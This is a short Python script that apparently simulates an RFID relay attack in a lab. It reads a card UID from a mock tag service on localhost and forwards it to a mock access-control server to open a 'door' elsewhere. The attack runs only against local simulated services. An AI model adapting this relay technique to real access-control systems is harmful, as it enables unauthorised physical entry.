#!/usr/bin/env python3
import socket, json, threading, time
from colorama import Fore, init
init(autoreset=True)

def relay_attack():
    print(f'{Fore.RED}[RELAY] Step 1: Query tag at location A (near victim)')
    s_tag = socket.socket()
    s_tag.settimeout(2)
    s_tag.connect(('127.0.0.1', 6001))
    s_tag.send(json.dumps({'cmd': 'QUERY'}).encode())
    tag_resp = json.loads(s_tag.recv(512).decode())
    s_tag.close()
    uid = tag_resp.get('uid', '')
    print(f'{Fore.RED}[RELAY] Captured UID from tag: {uid}')
    print(f'{Fore.RED}[RELAY] Step 2: Relay UID to AC Server at location B (door)')
    s_ac = socket.socket()
    s_ac.settimeout(2)
    s_ac.connect(('127.0.0.1', 7001))
    s_ac.send(json.dumps({'cmd': 'AUTH', 'uid': uid, 'timestamp': time.time()}).encode())
    ac_resp = json.loads(s_ac.recv(512).decode())
    s_ac.close()
    print(f'{Fore.GREEN}[RELAY] AC Response: {ac_resp}')
    print(f'{Fore.RED}[RELAY] Door at LOCATION B opened using card at LOCATION A!')

if __name__ == '__main__':
    relay_attack()
